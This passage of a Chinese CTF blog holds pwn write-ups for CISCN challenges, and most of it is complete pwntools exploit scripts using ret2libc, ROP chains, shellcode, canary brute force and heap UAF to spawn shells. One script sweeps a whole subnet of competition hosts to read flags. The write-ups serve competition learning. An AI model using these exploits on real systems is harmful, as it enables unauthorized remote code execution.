resultsystem_addr = s.get_address(sgtlibc.s_system)binsh_addr = s.get_address(sgtlibc.s_binsh)puts_addr_ = s.get_address(sgtlibc.s_puts)print(hex(system_addr), hex(binsh_addr), hex(puts_addr_))libc_base = puts_addr - puts_addr_system = libc_base + system_addrbin_sh = libc_base + binsh_addrp.recvuntil(b&#x27;choice!&#x27;)p.sendline(str(1))p.recvuntil(&#x27;be encrypted&#x27;)payload=b&#x27;\\x00&#x27;+b&#x27;a&#x27;*0x57+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system)+p64(ret)p.sendline(payload)p.interactive()\n\n[CISCN 2019 华中]PWN1题目说明ret2libc\n解题思路from pwn import *import sgtlibcio = remote(&#x27;node2.anna.nssctf.cn&#x27;,28993)elf=ELF(&#x27;./ciscn_2019&#x27;)pop_rdi_ret = 0x400c83puts_got = elf.got[&#x27;puts&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]ret_addr = 0x4006b9main = 0x400b28io.sendlineafter(&#x27;choice!\\n&#x27;,&#x27;1&#x27;)payload =b&#x27;\\0&#x27;+b&#x27;a&#x27;*(0x50-1+8)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)io.sendlineafter(&#x27;encrypted\\n&#x27;,payload)puts_addr = u64(io.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))log.info(&quot;puts addr is :%x&quot;%puts_addr)s = sgtlibc.Searcher()s.add_condition(&#x27;puts&#x27;,puts_addr)s.dump(db_index=2) # search libc , if returns multi-result ,default use index-0&#x27;s resultsystem_addr = s.get_address(sgtlibc.s_system)binsh_addr = s.get_address(sgtlibc.s_binsh)puts_addr_ = s.get_address(sgtlibc.s_puts)print(hex(system_addr), hex(binsh_addr), hex(puts_addr_))libc_base = puts_addr - puts_addr_system = libc_base + system_addrbin_sh = libc_base + binsh_addrio.sendlineafter(&#x27;choice!\\n&#x27;,&#x27;1&#x27;)payload =b&#x27;\\0&#x27;+b&#x27;a&#x27;*(0x50-1+8)+p64(ret_addr)+p64(pop_rdi_ret)+p64(bin_sh)+p64(system)io.sendlineafter(&#x27;encrypted\\n&#x27;,payload)io.interactive()\n\n[CISCN 2019 华南]PWN4题目说明栈迁移（跟上面东南 pwn2 是一样的？）\n解题思路from pwn import *context(log_level=&#x27;debug&#x27;,arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;) p=remote(&#x27;node2.anna.nssctf.cn&#x27;,28823)# p=process(&#x27;./hnpwn4&#x27;)elf=ELF(&#x27;./ciscn_2019&#x27;) sys_addr=0x8048400leave_ret=0x080484b8 payload1 = b&#x27;a&#x27;*0x27p.sendlineafter(&#x27;name?\\n&#x27;,payload1)p.recvuntil(&#x27;\\n&#x27;)oldebp = u32(p.recv(4)) payload2 = b&#x27;a&#x27;*4+p32(sys_addr)+p32(0)+p32(oldebp-0x28)+b&#x27;/bin/sh&#x27;payload2 = payload2.ljust(0x28,b&#x27;\\0&#x27;)payload2+=p32(oldebp-0x38)+p32(leave_ret)p.sendlineafter(&#x27;\\n&#x27;,payload2) p.interactive()\n\n[CISCN 2019 华北]PWN5题目说明shellcode\n解题思路什么保护都没有\n\n把 shellcode 写在 text 上再跳过去执行就好\n\n给了这么长的空间，这多是一件美事儿啊。直接用 shellcraft\nfrom pwn import *context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)io = remote(&#x27;node1.anna.nssctf.cn&#x27;,28920)shellcode = asm(shellcraft.sh())io.sendlineafter(b&#x27;name&#x27;,shellcode)name = 0x601080payload = b&#x27;a&#x27;*0x28 + p64(name)io.recvuntil(b&#x27;me?\\n&#x27;)io.send(payload)io.interactive()\n\n[CISCN 2019 华南]PWN8题目说明这道题比较奇妙\n我不是很懂这一整个是什么程序\n解题思路ida 打开全都是这种 jb 函数，所以靠运行时的字符找主函数（ALT+T）\n\n\n\n找到这里，再跟一下里面几个函数\n\nsub_410550 就是 printf\nsub_449BE0 就是一个 read 函数\n重头戏在 sub_400C40：\n\n它会把传入的字符进行异或再返回到“主函数”\n\n所以我们构造 payload 的时候记得先异或就好了\n但是这么多个函数怎么构造 ropchain 呢\n\n是静态链接，我们借用 ROPgadget 完成 ropchain 的构造：\nROPgadget –binary helloworld –ropchain\nROP chain generation===========================================================- Step 1 -- Write-what-where gadgets        [+] Gadget found: 0x47f7b1 mov qword ptr [rsi], rax ; ret        [+] Gadget found: 0x4040fe pop rsi ; ret        [+] Gadget found: 0x449b9c pop rax ; ret        [+] Gadget found: 0x444f00 xor rax, rax ; ret- Step 2 -- Init syscall number gadgets        [+] Gadget found: 0x444f00 xor rax, rax ; ret        [+] Gadget found: 0x474c00 add rax, 1 ; ret        [+] Gadget found: 0x474c01 add eax, 1 ; ret- Step 3 -- Init syscall arguments gadgets        [+] Gadget found: 0x4006e6 pop rdi ; ret        [+] Gadget found: 0x4040fe pop rsi ; ret        [+] Gadget found: 0x449bf5 pop rdx ; ret- Step 4 -- Syscall gadget        [+] Gadget found: 0x40139c syscall- Step 5 -- Build the ROP chain#!/usr/bin/env python3# execve generated by ROPgadgetfrom struct import pack# Padding goes herep = b&#x27;&#x27;p += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e0) # @ .datap += pack(&#x27;&lt;Q&#x27;, 0x0000000000449b9c) # pop rax ; retp += b&#x27;/bin//sh&#x27;p += pack(&#x27;&lt;Q&#x27;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x0000000000444f00) # xor rax, rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004006e6) # pop rdi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e0) # @ .datap += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x0000000000449bf5) # pop rdx ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x0000000000444f00) # xor rax, rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000040139c) # syscall\n\n很可惜，这段 ropchain 还是太长了，还需要缩短，最后结果 exp 如下\nfrom ctypes import *from pwn import *#io = process(&#x27;./pwn&#x27;)io = remote(&#x27;node3.anna.nssctf.cn&#x27;,28324)context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)elf = ELF(&#x27;./easy_pwn&#x27;)from struct import pack# Padding goes herep = b&#x27;&#x27;p += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e0) # @ .datap += pack(&#x27;&lt;Q&#x27;, 0x0000000000449b9c) # pop rax ; retp += b&#x27;/bin//sh&#x27;p += pack(&#x27;&lt;Q&#x27;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x0000000000444f00) # xor rax, rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004006e6) # pop rdi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e0) # @ .datap += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x0000000000449bf5) # pop rdx ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x0000000000444f00) # xor rax, rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000449b9c) # pop rax ; retp += p64(59)p += pack(&#x27;&lt;Q&#x27;, 0x000000000040139c) # syscallep = b&#x27;&#x27;for i in range(len(p)):        ep += p8(ord(p[i:i+1]) ^ 0x66)    payload = b&#x27;a&#x27;*0x50 + epio.sendafter(b&#x27;Password: \\n&#x27;, payload)io.interactive()\n\n[CISCN 2023 华南] 烧烤摊儿题目说明整数溢出把摊买下来，改名儿的时候存在溢出，静态链接用 ROPgadget 生成 ropchain\n解题思路from pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&#x27;./shaokao&#x27;)#io = process(&#x27;./shaokao&#x27;)io = remote(&#x27;39.106.71.184&#x27;,34604)def sla(a,b):    io.sendlineafter(a,b)def buy():    sla(&quot;&gt; &quot;,&quot;1&quot;)    sla(&quot;3. 勇闯天涯&quot;,&quot;1&quot;)    sla(&quot;来几瓶？&quot;,&quot;-114514&quot;)def cancan():    sla(&quot;&gt; &quot;,&quot;3&quot;)def vip():    sla(&quot;&gt; &quot;,&quot;4&quot;)def play(data):    sla(&quot;&gt; &quot;,&quot;5&quot;)    sla(&quot;烧烤摊儿已归你所有，请赐名：&quot;,data)cancan()buy()cancan()vip()#ROPgadget --binary shaokao --ropchainfrom struct import pack# Padding goes herep = b&#x27;&#x27;p += pack(&#x27;&lt;Q&#x27;, 0x000000000040a67e) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004e60e0) # @ .datap += pack(&#x27;&lt;Q&#x27;, 0x0000000000458827) # pop rax ; retp += b&#x27;/bin//sh&#x27;p += pack(&#x27;&lt;Q&#x27;, 0x000000000045af95) # mov qword ptr [rsi], rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000040a67e) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004e60e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x0000000000447339) # xor rax, rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000045af95) # mov qword ptr [rsi], rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000040264f) # pop rdi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004e60e0) # @ .datap += pack(&#x27;&lt;Q&#x27;, 0x000000000040a67e) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004e60e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x00000000004a404b) # pop rdx ; pop rbx ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004e60e8) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x4141414141414141) # paddingp += pack(&#x27;&lt;Q&#x27;, 0x0000000000447339) # xor rax, rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000402404) # syscallpayload = b&#x27;a&#x27;*0x28 + pplay(payload)   io.interactive()\n\n\n[CISCN 2023 华南]funcanary题目说明解题思路保护全开，吓人吧\n\nCancanneed main 函数\n\n重头戏在 fork 函数，每次循环它都会开出一个子进程（sub_128A），子进程中存在溢出。特别的，子进程的 canary 是不变的。我们可以利用这些特性对 canary 地址进行爆破\n\n看汇编还找到个后门函数，比赛时只看到了字符串没找到这个地方\n\n程序开启了 PIE 保护，canary 后三位固定，爆破 canary 第四位地址即可\nfrom pwn import *context(log_level = &#x27;debug&#x27;)#io = process(&#x27;./funcanary&#x27;)io = remote(&#x27;47.93.249.245&#x27;, &#x27;41984&#x27;)elf = ELF(&#x27;./funcanary&#x27;)io.recvuntil(b&#x27;welcome\\n&#x27;)canary = b&#x27;\\x00&#x27;for k in range(7):    for i in range(256):        payload = b&#x27;A&#x27;*0x68 + canary + p8(i)        io.send(payload)        a = io.recvuntil(b&#x27;welcome\\n&#x27;)        if b&#x27;have fun&#x27; in a:            canary += p8(i)            print(canary)            break            #print(b&#x27;canary:&#x27; + canary)        print(k, canary)print(canary)io.interactive()# 0x1324backdoor = 0x1229context(log_level =&#x27;debug&#x27;)for m in range(16):    tmp = m * 16 + 2    payload = b&#x27;A&#x27;*0x68 + canary + b&#x27;deadbeef&#x27; + b&#x27;\\x31&#x27; + p8(tmp)    io.send(payload)    a = io.recvline()    print(a)    if b&#x27;flag&#x27; in a:        io.interactive()    print(&#x27;m = &#x27; + str(m))    print(b&#x27;\\x29&#x27; + str(tmp).encode())    #try:        #a = rcvuntil(b&#x27;flag&#x27;)        #io.interactive()    #except:        #passio.interactive()\n\n最后都没打通，看 wp 说是要尝试多次，等复现环境上线再看看\nfrom pwn import*from ctypes import *#io = process(&quot;./pwn&quot;)io =remote(&#x27;node1.anna.nssctf.cn&#x27;,28422)elf = ELF(&quot;./funcanary&quot;)#libc = ELF(&quot;./glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug():    gdb.attach(io)    pause()io.recvuntil(&quot;welcome&quot;)canary = b&#x27;\\x00&#x27;for j in range(7):    for i in range(0x100):        io.send(cyclic(0x68) + canary +  i.to_bytes(1,&#x27;little&#x27;))        a = io.recvuntil(&#x27;welcome\\n&#x27;)        if b&#x27;have fun&#x27; in a:            canary += i.to_bytes(1,&#x27;little&#x27;)            breakpayload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x02&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x12&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x22&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x32&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x42&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x52&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x62&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x72&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x82&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x92&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\xa2&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\xb2&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\xc2&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\xd2&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\xe2&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\xf2&#x27;io.send(payload)io.interactive()\n\n这个能打通\n","tags":["wp"]},{"title":"ciscn2024华南赛区线下","url":"/2024/06/10/ciscn2024%E5%8D%8E%E5%8D%97%E8%B5%9B%E5%8C%BA%E7%BA%BF%E4%B8%8B/","content":"支持绿盟.jpg\n先吐槽pwn题的靶机\n开局修好了文件，发现winscp传东西传不上去(没权限)，问裁判咋回事，裁判说这是防止对面打进来删flag删库，把my_heap和flag.txt都设置成root权限了\n？这我咋修？\n大概差不多十一点，因为我winscp一直连着，这个点能传文件了，但是ssh又被ban了，chmod +x 想都别想\n就跟靶机玩了一上午，吃完中饭1点钟才正式开打a（对，因为权限问题解决不了就没有wd了)）\n第一次线下赛主办方先送中饭再开打的\n下午送了杯瑞幸还是不错的）\n来看题[ciscn2024 华南pwn1]保护全开2.34的libc漏洞点存在backdoor\nadd没有对大小进行限制,但是只能操作一个chunk\ndelete存在UAF\nedit仅有0x8，但是有一次magic，可以泄露backdoor地址以及edit0x10(可以越界)\nshow会对输出进行一段“加密”，逆一下就好\noutput=b&quot;&quot;while len(libcbase)&lt;6:    output+=p8((u8(p.recv(1))^(len(libcbase)+153)))\n\nfixsystem直接改成puts。(看平台，这个可能check不过，队友直接把这个backdoor给nop掉了)\nadd没修\ndelete的UAF修法：先把eh_frame段的flag改为7，使其可执行，在上面利用keypatch写下以下代码\ncall 0x10E0 ;call free@pltpush    rbpmov     rbp, rspmov     rax, cs:bufmov     rdi, rax;get chunk_ptr        xor r8,r8push r8pop raxmov cs:buf,raxnopjmp 0x13BD;跳回main\n\n再把原来的free改为jmp到自己写的代码上即可\nbreak没有控制大小和UAF，利用unsortedbin可以泄露libc地址然后可以改strlen为backdoor\nfrom pwn import *from pwn import p64,u64,p8,u8#p = remote(&quot;172.16.75.105&quot;,)context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)#context.log_level=&#x27;debug&#x27;libc = ELF(&#x27;libc.so.6&#x27;)#p = (&quot;172.16.75.105&quot;,9999)#p = process(&quot;my_heap&quot;)#for i in range(0,6):    #add(i,0x40)def cmd(choice):    p.recvuntil(&quot;edit&quot;)    p.sendline(str(choice))def add(size):    cmd(1)    p.recvuntil(&quot;which one you choose?&quot;)    p.sendline(str(1))    p.recvuntil(&quot;size:&quot;)    p.sendline(str(size))def add_1():    cmd(1)    p.recvuntil(&quot;which one you choose?&quot;)    p.sendline(str(2))def delete():    cmd(2)def show():    cmd(3)def edit(content):    cmd(4)    p.recvuntil(&quot;edit data:&quot;)    p.send(content)def exp():    add(0x430)    add_1()    delete()    add_1()    show()    p.recvuntil(&quot;the data:&quot;)    libcbase=b&quot;&quot;    while len(libcbase)&lt;6:        libcbase+=p8((u8(p.recv(1))^(len(libcbase)+153)))    libcbase=u64(libcbase.ljust(8,b&#x27;\\x00&#x27;))-0x21b0e0    success(&quot;libcbase: %s&quot;,hex(libcbase))    strlen_got=libcbase+libc.got[&#x27;strlen&#x27;]    add(0x70)    delete()    show()    p.recvuntil(&quot;the data:&quot;)    key=b&quot;&quot;    while len(key)&lt;6:        key+=p8((u8(p.recv(1))^(len(key)+153)))    key=u64(key.ljust(8,b&#x27;\\x00&#x27;))    heapbase=key&lt;&lt;12    success(&quot;heapbase: %s&quot;,hex(heapbase))    tcache=heapbase+0xc0    addr=heapbase+0x290    success(&quot;addr: %s&quot;,hex(addr))    success(&quot;tcache: %s&quot;,hex(tcache))    cmd(5)    p.recvuntil(&quot;0x&quot;)    backdoor=u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8, b&quot;\\x00&quot;))    base=backdoor-0x12be    buf=base+0x0000000000004040    success(&quot;backdoor: %s&quot;,hex(backdoor))    success(&quot;base: %s&quot;,hex(base))    p.recvuntil(&quot;edit data:&quot;)    p.send(p64(0)*2)    delete()    edit(p64(buf^key))    add(0x70)    add(0x70)    edit(p64(strlen_got))    edit(p64(backdoor))    p.sendline(&quot;cat flag.txt&quot;)for i in range(0,255):    global ip,p    ip = &#x27;172.16.75.&#123;i&#125;&#x27;    p = (ip,9999)    exp()\n","tags":["wp"]},{"title":"UAF","url":"/2023/08/24/UAF/","content":"直接上例题[NISACTF 2022]UAFchecksec，注意一下是32位\nstr1k3@ubuntu:~/Desktop$ checksec 